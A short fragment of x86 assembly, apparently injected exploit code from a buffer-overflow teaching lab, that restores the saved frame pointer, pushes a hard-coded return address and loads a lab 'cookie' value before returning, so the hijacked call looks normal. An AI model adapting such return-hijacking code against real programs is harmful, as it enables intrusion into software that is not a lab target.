leal 0x28(%esp),%eax         # get old ebp
movl %eax,%ebp               # restoret the old ebp
subl $0x4,%esp
movl $0x8048c93,(%esp)
movl $0x7cee92d1,%eax        # set user cookie id
ret